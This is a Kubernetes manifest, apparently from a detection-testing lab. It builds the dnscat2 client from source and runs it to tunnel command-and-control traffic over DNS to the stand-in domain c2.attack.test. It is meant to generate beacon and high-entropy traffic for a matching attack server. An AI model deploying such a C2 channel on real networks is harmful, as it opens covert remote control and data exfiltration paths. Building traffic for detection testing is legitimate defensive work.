# dnscat2 client — C2 over DNS. Генерирует трафик: C2_BEACON, C2_TXT_REQUEST, HIGH_ENTROPY.
#
# Официальный клиент — на C (не Ruby), собирается из исходников. Гем dnscat2 в RubyGems нет.
# Сервер (dnscat2) в namespace attack-server (servers/deploy.sh dnscat2).
# Первый старт ~1–2 мин (clone + make).
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dnscat2-client
  namespace: attack
  labels:
    app: attack-traffic
    tool: dnscat2
spec:
  replicas: 1
  selector:
    matchLabels:
      app: attack-traffic
      tool: dnscat2
  template:
    metadata:
      labels:
        app: attack-traffic
        tool: dnscat2
    spec:
      affinity:
        podAntiAffinity:
          preferredDuringSchedulingIgnoredDuringExecution:
            - weight: 100
              podAffinityTerm:
                labelSelector:
                  matchLabels:
                    app: attack-traffic
                topologyKey: kubernetes.io/hostname
      containers:
        - name: dnscat2
          image: alpine:3.19
          command: ["/bin/sh", "-c"]
          args:
            - |
              set -e
              echo "Waiting for DNS..."
              sleep 10
              for i in 1 2 3 4 5; do
                apk add --no-cache build-base git && break
                echo "apk failed (attempt $i/5), retrying in 15s..."
                sleep 15
              done
              for i in 1 2 3 4 5; do
                git clone --depth 1 https://github.com/iagox86/dnscat2.git && break
                echo "git clone failed (attempt $i/5), retrying in 15s..."
                sleep 15
                rm -rf dnscat2
              done
              cd dnscat2/client && make
              BIN=./dnscat
              [ -x ./dnscat ] || BIN=./dnscat2
              [ -x "$BIN" ] || { echo "FATAL: no dnscat binary"; sleep 3600; exit 1; }
              exec $BIN "$ATTACK_DOMAIN"
          env:
            - name: ATTACK_DOMAIN
              value: "c2.attack.test"
            - name: DNSCAT2_SECRET
              value: ""
          resources:
            requests:
              cpu: 100m
              memory: 128Mi
            limits:
              cpu: 500m
              memory: 384Mi
      restartPolicy: Always
